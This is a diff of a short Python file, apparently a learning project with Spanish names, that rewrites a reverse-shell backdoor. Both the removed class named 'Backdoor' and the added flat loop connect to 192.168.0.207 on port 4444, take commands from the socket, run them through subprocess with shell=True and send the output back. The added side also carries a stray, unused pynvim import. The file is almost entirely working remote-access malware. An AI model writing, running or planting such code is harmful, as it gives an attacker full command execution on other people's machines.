@@ -1,36 +1,21 @@
 import socket
 import subprocess
-import json
 
-class Backdoor:
-	def __init__(self, ip, port):
-		self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-		self.connection.connect((ip, port))
+from pynvim import command
 
-	def reliable_send(self, data):
-		json_data = json.dumps(data)
-		self.connection.send(json_data)
+def ejecutar_comando(command):
+	return subprocess.check_output(command, shell=True)
 
-	def reliable_recv(self):
-		json_data = ""
-		while True:
-			try:
-				json_data = self.connection.recv(1024)
-				return json.loads(json_data)
-			except ValueError:
-				continue
+connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 
-	def ejecutar_comando(self, command):
-		return subprocess.check_output(command, shell=True)
+connection.connect(("192.168.0.207", 4444))
 
 
-	def run(self):
-		while True:
-			command = self.reliable_recv()
-			resultados_comando = self.ejecutar_comando(command)
-			self.reliable_send(resultados_comando)
 
-		connection.close()
+while True:
+	command = connection.recv(1024)
+	resultados_comando = ejecutar_comando(command)
+	connection.send(resultados_comando)
 
-puerta = Backdoor("192.168.0.207", 4444)
-puerta.run()
+
+connection.close()
